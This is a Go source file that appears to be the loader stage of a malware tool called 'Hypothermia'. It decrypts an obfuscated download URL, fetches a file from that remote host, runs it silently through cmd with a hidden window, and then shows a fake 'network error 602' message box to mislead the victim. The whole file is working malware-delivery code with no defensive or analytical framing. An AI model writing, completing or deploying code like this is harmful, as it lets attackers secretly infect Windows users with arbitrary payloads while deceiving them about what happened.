package main

import (
	"fmt"
	"os/exec"
	"syscall"
	"unsafe"

	"Hypothermia/src/utils"
	"Hypothermia/src/utils/crypto"
)

const (
	FAKE_ERROR       bool   = true
	FAKE_ERROR_TITLE string = "Hypothermia"
	FAKE_ERROR_BODY  string = "Hypothermia failed to init: network error 602"
)

var (
	user32 *syscall.LazyDLL  = syscall.NewLazyDLL("user32.dll")
	msgBox *syscall.LazyProc = user32.NewProc("MessageBoxW")
)

var DOWNLOAD_URL string = "D2oJVaBzzBPSOnBQJDpbjfQYOp1Eex+LmzaoZ/aCJs8nvfo65+lv0Q886XixnE3xo2z5BvyvsQCTmgjg1Z829SFIsFgslEVduF/UpjVMYg/aj1LptwO0pdqcXxQwV0LhdIGrz6r77EK6HCZSfS6fW0AcI91F+SnvT64x8llXilUoWxyKFi3mltZ49s/HgHlkpcohCaiMWZmQfH3RWIGuACcipvV34Bb6HE/GnbE335cd7TzLhdI8oh5cMnsAl15g"

func main() {
	DOWNLOAD_URL = utils_crypto.Decrypt(DOWNLOAD_URL)

	path, code := utils.DonwloadFile(DOWNLOAD_URL, "")
	if code != "" {
		fmt.Println(code)
		fmt.Scanln()
		return
	}

	cmd := exec.Command("cmd", "/c", path)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	cmd.Stderr = nil
	cmd.Stdout = nil
	cmd.Stdin = nil

	err := cmd.Run()
	if err != nil {
		fmt.Println("🟥 Failed to run")
		fmt.Scanln()
		return
	}

	if FAKE_ERROR {
		body, _ := syscall.UTF16FromString(FAKE_ERROR_BODY)
		title, _ := syscall.UTF16FromString(FAKE_ERROR_TITLE)

		msgBox.Call(
			uintptr(0),
			uintptr(unsafe.Pointer(&body[0])),
			uintptr(unsafe.Pointer(&title[0])),
			uintptr(0x00000000),
		)
	}
}
